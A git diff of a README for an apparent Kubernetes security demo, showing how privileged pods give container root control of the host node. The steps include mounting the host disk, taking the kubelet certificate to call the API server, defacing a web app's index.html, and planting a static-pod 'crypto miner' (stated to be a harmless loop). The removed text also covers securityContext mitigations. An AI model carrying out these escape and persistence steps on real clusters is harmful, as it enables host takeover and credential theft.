@@ -1,74 +1,97 @@
 
-## Deploy privileged container
+# Verify that root on container is root on host
 
-## Verify that root on container is root on host
+- Deploy a privileged pod with access to the root directory of the host
 
-ssh into the node
-```
-minikube ssh
-```
-find the currently running sleep processes
+    ```
+    kubectl apply -f pod.yaml
+    ```
 
-```
-ps -C sleep -o user,uid,cmd
-```
+- SSH into the minikube node
 
-Connect to the container and run `sleep 100` the verify that the node has another sleep process with root user
+    ```
+    minikube ssh
+    ```
 
-## Change host name
+- Find the currently running sleep processes inside minikube
 
-Running `hostname newname` will fail because although the container is running using root account, the root has limited set of linux capabilities that can't be increased
+    ```
+    ps -C sleep -o user,uid,cmd
+    ```
 
-In order to increate those capabilities, let's modify the pod to include 
-```yaml
-securityContext:
-      privileged: true
-```
+- Access the shell of the running container
 
-now changing the host name with `hostname newname` will work
+    ```
+    kubectl exec -it webapp sh
+    ```
 
-## Escape the container `mount` host
+- Run `sleep 100` inside the shell of the running container
 
-Running the `df` command will show the disks and now I can mount to the host using 
+- Verify that the node has another sleep process with root user by running the following command inside the minikube shell
 
-```
-mkdir /host
-mount /dev/sda1 /host
-```
+    ```
+    ps -C sleep -o user,uid,cmd
+    ```
 
-now navigating to the directory `/tmp/host/var/lib/kubelet/pki` we can find the kubelet certificate which we can use and call the api server
+# Modify web app file system
 
+- Deploy a privileged pod with access to the root directory of the host
 
-## Mitigate the risks by using security context
+    ```
+    kubectl apply -f pod.yaml
+    ```
 
-### runAsUser => sleep
+- Access the shell of the running container
 
-Using the runAsUser parameter you can modify the user ID of the processes inside a container.
+    ```
+    kubectl exec -it webapp sh
+    ```
 
-### allowPrivilegeEscalation = false
+- Verify the identity of the container running user is root
 
-means the container cannot escalate privileges
-The execve system call can grant a newly-started program privileges that its parent did not have, such as the setuid or setgid Linux flags. This is controlled by the AllowPrivilegeEscalation boolean and should be used with care and only when required.
+    ```
+    id
+    ```
 
-### ReadOnlyRootFilesystem = true /No Demo
+- Verify the capabilities that the user has by running `amicontained` inside the container shell
 
-means the container can only read the root filesystem
+- Open the web app in browser buing using port-forward command then open the url in the browser `http://localhost:3000/`
 
+    ```
+    kubectl port-forward webapp 3000:3000
+    ```
 
-- capsh --print | grep Current
+- Modify `index.html` by adding an image to the bottom of the html file
 
-- write file 
-- mount host files
-- 
+    ```
+    echo "<img src=\"lack-of-security.jpg\" />" >> /app/wwwroot/index.html
+    ```
 
-echo "<img src=\"lack-of-security.jpg\" />" >> index.html
+# Schedule a crypto miner using static pods
 
+** This demo deploys a pod with an infinite loop, not a real crypto miner :)
 
-kubectl get pods --client-certificate=kubelet.crt --client-key=kubelet.key
+- Deploy a privileged pod with access to the root directory of the host
 
-Id 
-sleep ?? demo or somewhere in slides?
-amicontained
-change file content
------
+    ```
+    kubectl apply -f pod.yaml
+    ```
 
+- Access the shell of the running container
+
+    ```
+    kubectl exec -it webapp sh
+    ```
+
+- Create fake crypto miner pod by creating the `crypto-miner.yaml` file inside `etc/kubernetes/manifests` directory
+
+  * Paste the following inside the container shell
+    ```
+    cat <<EOF > /hostroot/etc/kubernetes/manifests/crypto-miner.yaml
+    ```
+
+  * Paste the content of the `crypto-miner` pod from `crypto-miner.yaml` 
+
+  * Enter EOF
+
+  * Remember to delete the `crypto-miner.yaml`
